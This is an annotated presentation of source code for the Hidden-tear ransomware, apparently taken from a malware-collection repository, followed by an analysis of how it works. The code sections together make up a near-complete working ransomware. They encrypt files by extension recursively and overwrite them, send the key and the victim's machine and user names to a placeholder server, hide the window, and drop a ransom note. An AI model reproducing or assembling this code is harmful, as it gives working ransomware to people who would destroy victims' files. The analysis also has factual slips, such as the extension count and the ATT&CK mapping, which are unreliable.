# Hidden-tear Educational Ransomware - AES-256-CBC with SHA-256 Key Derivation

## Repository
**Malware-Collection-master** → Hidden-tear/hidden-tear

## Source File Path
`/Hidden-tear/hidden-tear/hidden-tear/Form1.cs`

## Language
C#

## Code Snippet

### AES-256-CBC Encryption Algorithm (Lines 77-105)
```csharp
//AES encryption algorithm
public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] encryptedBytes = null;
    // Static 8-byte salt
    byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
    
    using (MemoryStream ms = new MemoryStream())
    {
        using (RijndaelManaged AES = new RijndaelManaged())
        {
            AES.KeySize = 256;
            AES.BlockSize = 128;
            
            // Derive key and IV from password using PBKDF2 with 1000 iterations
            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            
            AES.Mode = CipherMode.CBC;
            
            using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                cs.Close();
            }
            encryptedBytes = ms.ToArray();
        }
    }
    
    return encryptedBytes;
}
```

### Single File Encryption with SHA-256 Hashing (Lines 129-143)
```csharp
//Encrypts single file
public void EncryptFile(string file, string password)
{
    // Load entire file into memory
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
    
    // Hash the password with SHA256 before using it as encryption key
    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
    
    // Encrypt file content
    byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
    
    // Overwrite original file with encrypted data
    File.WriteAllBytes(file, bytesEncrypted);
    
    // Rename file with .locked extension
    System.IO.File.Move(file, file+".locked");
}
```

### Recursive Directory Encryption (Lines 146-172)
```csharp
//encrypts target directory
public void encryptDirectory(string location, string password)
{
    //extensions to be encrypt
    var validExtensions = new[]
    {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
        ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", 
        ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
    };
    
    string[] files = Directory.GetFiles(location);
    string[] childDirectories = Directory.GetDirectories(location);
    
    // Encrypt all files with valid extensions in current directory
    for (int i = 0; i < files.Length; i++){
        string extension = Path.GetExtension(files[i]);
        if (validExtensions.Contains(extension))
        {
            EncryptFile(files[i],password);
        }
    }
    
    // Recursively encrypt subdirectories
    for (int i = 0; i < childDirectories.Length; i++){
        encryptDirectory(childDirectories[i],password);
    }
}
```

### Password Generation and C2 Exfiltration (Lines 108-127)
```csharp
//creates random password for encryption
public string CreatePassword(int length)
{
    const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    StringBuilder res = new StringBuilder();
    Random rnd = new Random();
    while (0 < length--){
        res.Append(valid[rnd.Next(valid.Length)]);
    }
    return res.ToString();
}

//Sends created password target location
public void SendPassword(string password){
    
    string info = computerName + "-" + userName + " " + password;
    var fullUrl = targetURL + info;
    
    // Send encryption key to attacker's server via HTTP GET
    var conent = new System.Net.WebClient().DownloadString(fullUrl);
}

// Target URL for key exfiltration
string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
string userName = Environment.UserName;
string computerName = System.Environment.MachineName.ToString();
```

### Main Execution Flow (Lines 174-186)
```csharp
public void startAction()
{
    // Generate random 15-character password
    string password = CreatePassword(15);
    
    // Target C:\Users\<username>\Desktop\test directory
    string path = "\\Desktop\\test";
    string startPath = userDir + userName + path;
    
    // Exfiltrate encryption key to C2 server
    SendPassword(password);
    
    // Encrypt all files in target directory recursively
    encryptDirectory(startPath,password);
    
    // Create ransom note
    messageCreator();
    
    // Clear password from memory and exit
    password = null;
    System.Windows.Forms.Application.Exit();
}
```

### Stealth Form Execution (Lines 63-73)
```csharp
private void Form1_Load(object sender, EventArgs e)
{
    Opacity = 0;                  // Make form invisible
    this.ShowInTaskbar = false;   // Hide from taskbar
    //starts encryption at form load
    startAction();
}

private void Form_Shown(object sender, EventArgs e)
{
    Visible = false;              // Ensure form is hidden
    Opacity = 100;
}
```

### Ransom Note Creation (Lines 188-195)
```csharp
public void messageCreator()
{
    string path = "\\Desktop\\test\\READ_IT.txt";
    string fullpath = userDir + userName + path;
    string[] lines = { 
        "Files have been encrypted with hidden tear", 
        "Send me some bitcoins or kebab", 
        "And I also hate night clubs, desserts, being drunk." 
    };
    System.IO.File.WriteAllLines(fullpath, lines);
}
```

## Explanation

**Hidden-tear** is an open-source educational ransomware proof-of-concept developed by Utku Sen (Jani) in August 2015 to demonstrate ransomware mechanics. Despite being created for research/education, its simple yet effective design has been adapted by real-world threat actors, making it one of the most influential educational malware projects.

**Educational Intent:**
The source code header explicitly warns: *"hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent."* This demonstrates responsible disclosure practices in malware research, though the code has been misused by cybercriminals who modified it for actual attacks.

**Encryption Architecture:**
- **AES-256-CBC**: Uses Rijndael managed encryption with 256-bit keys in Cipher Block Chaining mode. The encryption password undergoes two-stage transformation: (1) SHA-256 hash to produce 32-byte digest, (2) PBKDF2 key derivation (Rfc2898DeriveBytes) with static 8-byte salt and 1000 iterations to generate both AES key and IV.
- **Static Salt Weakness**: The hardcoded salt `{1, 2, 3, 4, 5, 6, 7, 8}` is a critical vulnerability - if the password is known/leaked, files can be decrypted universally. Real ransomware typically uses per-file random salts to prevent this.
- **Single-Password Design**: Uses one 15-character random password for all files in the session. If this password is intercepted during C2 transmission or logged anywhere, all files can be recovered.
- **In-Place Encryption**: Overwrites original files with encrypted content, then renames to `.locked` extension. This prevents forensic recovery of plaintext but also means encryption failure corrupts data permanently.

**Key Management:**
- **C2 Exfiltration**: Sends the encryption password to attacker's C2 server via HTTP GET request in the format: `https://www.example.com/hidden-tear/write.php?info=<ComputerName>-<Username> <Password>`. This enables victim identification and password-based decryption if ransom is paid.
- **Memory Clearing**: Sets `password = null` after use, though this doesn't guarantee memory scrubbing in .NET managed memory (garbage collector controls deallocation).

**Operational Characteristics:**
- **Limited Scope**: Only encrypts `C:\Users\<username>\Desktop\test` directory - this is a safety measure for the educational version to limit damage during testing. Real variants modify this path to encrypt user documents, downloads, desktop, and external drives.
- **Extension Filtering**: Targets 21 common file extensions including Office documents (.doc, .xlsx, .ppt), source code (.sln, .php, .html), databases (.sql, .mdb), and media (.jpg, .png, .psd).
- **Recursive Traversal**: Walks directory tree recursively to encrypt files in all subdirectories.
- **Stealth Execution**: Runs as invisible Windows Form application with `Opacity = 0`, `ShowInTaskbar = false`, and `Visible = false` to avoid user detection during encryption.

**Ransom Note:**
The humorous ransom message (*"Send me some bitcoins or kebab"* and *"I also hate night clubs, desserts, being drunk"*) clearly indicates this is a test/educational implementation. Real ransomware variants derived from Hidden-tear replace this with serious extortion demands, Bitcoin addresses, and TOR contact information.

**Impact and Legacy:**
Hidden-tear became notorious when script kiddies and cybercriminals copied and modified it for actual attacks, spawning numerous variants including:
- **EDA2** (Turkish ransomware)
- **Magic Ransomware**
- **Razy Ransomware**
- Multiple underground "builder" tools based on its codebase

This demonstrates the dual-use dilemma in malware research: educational code can be weaponized by malicious actors, raising ethical questions about public disclosure of functional exploit code.

**MITRE ATT&CK Mapping:**
- **T1486 (Data Encrypted for Impact)**: Primary technique - encrypts files for extortion
- **T1071.001 (Application Layer Protocol: Web Protocols)**: HTTP GET request for C2 communication
- **T1027.002 (Obfuscated Files or Information: Software Packing)**: Hidden Windows Form for stealth
- **T1083 (File and Directory Discovery)**: Recursive directory enumeration

This implementation showcases how minimal code (< 200 lines) can achieve functional ransomware capabilities, highlighting why even educational malware requires careful handling and access controls.

